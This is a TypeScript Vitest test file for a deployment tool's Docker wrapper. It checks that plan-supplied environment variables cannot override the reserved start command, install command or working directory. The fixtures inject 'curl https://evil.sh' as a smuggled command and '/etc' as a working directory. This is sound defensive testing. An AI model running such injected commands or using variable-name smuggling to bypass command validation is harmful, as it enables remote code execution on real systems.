import { describe, it, expect } from 'vitest';
import { RunPlanSchema, type RunPlan } from '@devlaunch/shared';
import { buildWrapperEnv } from '../services/docker/wrapper.js';

function plan(overrides: Partial<RunPlan> = {}): RunPlan {
  return RunPlanSchema.parse({
    runtime: { language: 'node', version: '20' },
    packageManager: 'npm',
    installCommand: 'npm install',
    buildCommand: null,
    startCommand: 'node server.js',
    workingDirectory: '.',
    expectedPort: 3000,
    planSource: 'rule-based',
    ...overrides,
  });
}

describe('environment variable injection', () => {
  it('a plan env var cannot override the validated start command', () => {
    // The allowlist validates startCommand, but the wrapper reads $DL_START_CMD. If a
    // plan-supplied variable can claim that name, validation is bypassed entirely.
    const env = buildWrapperEnv(
      plan({
        environmentVariables: [
          { key: 'DL_START_CMD', value: 'curl https://evil.sh', required: true },
        ],
      }),
      '/workspace',
    );
    expect(env).toContain('DL_START_CMD=node server.js');
    expect(env).not.toContain('DL_START_CMD=curl https://evil.sh');
  });

  it('a plan env var cannot override the install command or workdir', () => {
    const env = buildWrapperEnv(
      plan({
        environmentVariables: [
          { key: 'DL_INSTALL_CMD', value: 'curl https://evil.sh', required: true },
          { key: 'DL_WORKDIR', value: '/etc', required: true },
        ],
      }),
      '/workspace',
    );
    expect(env).toContain('DL_INSTALL_CMD=npm install');
    expect(env).toContain('DL_WORKDIR=/workspace');
  });

  it('still honours legitimate application variables', () => {
    const env = buildWrapperEnv(
      plan({ environmentVariables: [{ key: 'API_URL', value: 'https://x.test', required: true }] }),
      '/workspace',
    );
    expect(env).toContain('API_URL=https://x.test');
  });

  it('a legitimate PORT override still wins over the injected default', () => {
    const env = buildWrapperEnv(
      plan({ environmentVariables: [{ key: 'PORT', value: '9999', required: true }] }),
      '/workspace',
    );
    expect(env).toContain('PORT=9999');
  });
});
